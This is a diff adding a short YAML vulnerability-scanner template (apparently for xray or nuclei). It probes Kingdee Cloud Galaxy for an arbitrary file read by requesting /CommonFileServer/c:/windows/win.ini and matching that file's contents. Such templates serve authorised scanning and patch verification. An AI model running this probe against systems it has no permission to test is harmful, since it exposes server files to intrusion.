@@ -1,0 +1,14 @@
+id: poc-yaml-jindie-yunxingkong-arbitrary-file-read
+info:
+  name: 金蝶云星空-任意文件读取
+  severity: high
+  tags:
+  - 两高一弱
+  - 文件读取
+  finger: 金蝶云星空
+requests:
+- method: GET
+  path: /CommonFileServer/c:/windows/win.ini
+  expression: status_code == 200 && contains(body, "[fonts]") && contains(body, "[extensions]")
+variables: {}
+transport: http
